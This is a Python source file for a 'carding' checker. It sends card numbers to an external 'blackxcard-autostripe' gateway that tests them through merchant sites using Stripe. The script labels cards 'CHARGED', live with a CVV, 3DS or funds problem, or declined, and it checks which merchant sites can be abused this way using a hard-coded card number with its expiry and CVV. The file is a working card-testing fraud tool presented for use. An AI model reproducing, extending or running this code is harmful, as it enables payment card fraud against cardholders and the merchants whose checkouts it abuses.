# AutoStripe API Function
# Endpoint: https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site={site}/cc={cc}

import json
import httpx
import asyncio
import os

BASE_URL = "https://blackxcard-autostripe.onrender.com"
API_KEY = "Blackxcard"
GATEWAY = "autostripe"
SITES_PATH = "DATA/sites.json"

def get_site(user_id):
    """Get user's saved site from sites.json"""
    try:
        with open(SITES_PATH, "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id), {}).get("site")
    except Exception:
        return None

def get_user_site_info(user_id):
    """Get user's saved site info including gate"""
    try:
        with open(SITES_PATH, "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except Exception:
        return None

async def check_card_autostripe(user_id, cc, site=None):
    """
    Check card using AutoStripe API
    URL Format: https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site={site}/cc={cc}
    """
    if not site:
        site = get_site(user_id)
    if not site:
        return "Site Not Found"

    # Build the API URL
    url = f"{BASE_URL}/gateway={GATEWAY}/key={API_KEY}/site={site}/cc={cc}"

    retries = 0
    data = {}
    response_text = ""
    
    while retries < 3:
        try:
            async with httpx.AsyncClient(timeout=120.0) as client:
                response = await client.get(url)
                
                # Try to parse as JSON first
                try:
                    data = response.json()
                    response_text = str(data.get("Response", data.get("response", data.get("message", str(data))))).upper()
                except Exception:
                    # If not JSON, use raw text
                    response_text = response.text.upper()
                    data = {"Response": response.text}

                # Check for connection errors that need retry
                if any(x in response_text for x in [
                    "SERVER DISCONNECTED",
                    "CONNECTION ERROR",
                    "INCOMPLETE CHUNKED READ",
                    "PEER CLOSED CONNECTION"
                ]):
                    retries += 1
                    await asyncio.sleep(1)
                    continue
                
                break

        except httpx.ReadTimeout:
            return "Request Timeout"
        except httpx.ConnectError:
            return "Connection Failed"
        except Exception as e:
            return f"Error: {str(e)}"

    if retries == 3:
        return "Connection Failed (Retries Exhausted)"

    # Parse the response
    return parse_autostripe_response(response_text, data)

def parse_autostripe_response(response_text, data=None):
    """Parse AutoStripe API response and return status"""
    response_upper = response_text.upper()
    
    # Check for charged/success responses
    if any(x in response_upper for x in ["CHARGED", "SUCCESS", "APPROVED", "ORDER_PLACED", "THANK YOU", "PAYMENT_INTENT_SUCCEEDED"]):
        return "CHARGED"
    
    # Check for CVV/CVC related responses (Live Card)
    if any(x in response_upper for x in [
        "INVALID_CVC", "INCORRECT_CVC", "SECURITY_CODE", 
        "CVV", "CVC_CHECK_FAILED", "INCORRECT_CVV"
    ]):
        return "CCN [CVV]"
    
    # Check for 3D Secure / Authentication required (Live Card)
    if any(x in response_upper for x in [
        "3D_SECURE", "3DS_REQUIRED", "3D_AUTHENTICATION", 
        "AUTHENTICATION_REQUIRED", "REQUIRES_ACTION"
    ]):
        return "CCN [3DS]"
    
    # Check for insufficient funds (Live Card)
    if any(x in response_upper for x in ["INSUFFICIENT_FUNDS", "INSUFFICIENT_BALANCE"]):
        return "CCN [FUNDS]"
    
    # Check for AVS/Address mismatch (Live Card)
    if any(x in response_upper for x in [
        "INCORRECT_ZIP", "INCORRECT_ADDRESS", "POSTAL_CODE",
        "MISMATCHED_ZIP", "MISMATCHED_BILLING", "AVS_FAILURE"
    ]):
        return "CCN [AVS]"
    
    # Check for declined responses
    if any(x in response_upper for x in [
        "DECLINED", "CARD_DECLINED", "DO_NOT_HONOR", 
        "GENERIC_DECLINE", "LOST_CARD", "STOLEN_CARD",
        "FRAUDULENT", "PICKUP_CARD", "RESTRICTED_CARD"
    ]):
        return "DECLINED"
    
    # Check for invalid card
    if any(x in response_upper for x in [
        "INVALID_CARD", "INVALID_NUMBER", "INCORRECT_NUMBER",
        "EXPIRED_CARD", "INVALID_EXPIRY", "CARD_NOT_SUPPORTED"
    ]):
        return "INVALID CARD"
    
    # Check for rate limit
    if any(x in response_upper for x in ["RATE_LIMIT", "TOO_MANY_REQUESTS", "IP RATE LIMIT"]):
        return "RATE LIMITED"
    
    # Check for site/gateway errors
    if any(x in response_upper for x in ["SITE_ERROR", "GATEWAY_ERROR", "PRODUCT ID"]):
        return "SITE ERROR"
    
    # Return raw response if no pattern matches
    return response_text[:100] if len(response_text) > 100 else response_text

async def validate_site_autostripe(site, test_cc="4403934091847371|06|2026|097"):
    """
    Validate if a site works with AutoStripe
    Returns dict with site info or None if not supported
    """
    url = f"{BASE_URL}/gateway={GATEWAY}/key={API_KEY}/site={site}/cc={test_cc}"
    
    try:
        async with httpx.AsyncClient(timeout=90.0) as client:
            response = await client.get(url)
            
            try:
                data = response.json()
            except Exception:
                data = {"Response": response.text}
            
            # Check if we got a valid response (not an error about site)
            response_text = str(data.get("Response", data.get("response", data.get("message", str(data))))).upper()
            
            # If it returns a card processing response, site is valid
            if any(x in response_text for x in [
                "DECLINED", "CHARGED", "CVV", "CVC", "3DS", "3D_SECURE",
                "INSUFFICIENT", "APPROVED", "INVALID", "AUTHENTICATION"
            ]):
                return {
                    "site": site,
                    "gate": "AutoStripe",
                    "response": response_text[:50]
                }
            
            return None
            
    except Exception as e:
        return None
